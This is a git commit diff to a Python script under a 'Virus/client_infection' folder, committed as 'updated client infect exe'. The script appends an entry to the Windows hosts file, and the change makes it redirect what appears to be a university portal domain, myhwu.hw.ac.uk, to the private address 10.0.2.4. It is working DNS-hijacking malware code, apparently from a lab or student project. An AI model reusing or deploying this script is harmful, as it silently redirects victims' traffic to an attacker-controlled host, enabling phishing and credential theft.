d6a8416da1bb3626e004a9a616645ec1ce1a23ed
Jacinth Daniel Moses <jackdanielmoseshs@gmail.com>
2024-03-14 23:17:52 +0400

    updated client infect exe

--- Virus/client_infection/client_dns_infect.py
+++ Virus/client_infection/client_dns_infect.py
@@ -1,6 +1,6 @@
 hosts_path = "C:\Windows\System32\drivers\etc\hosts"
 
-line_to_append = "192.168.1.1 example.com" 
+line_to_append = "10.0.2.4 myhwu.hw.ac.uk" 
 
 with open(hosts_path, "a") as file:
     file.write('\n' + line_to_append + "\n")
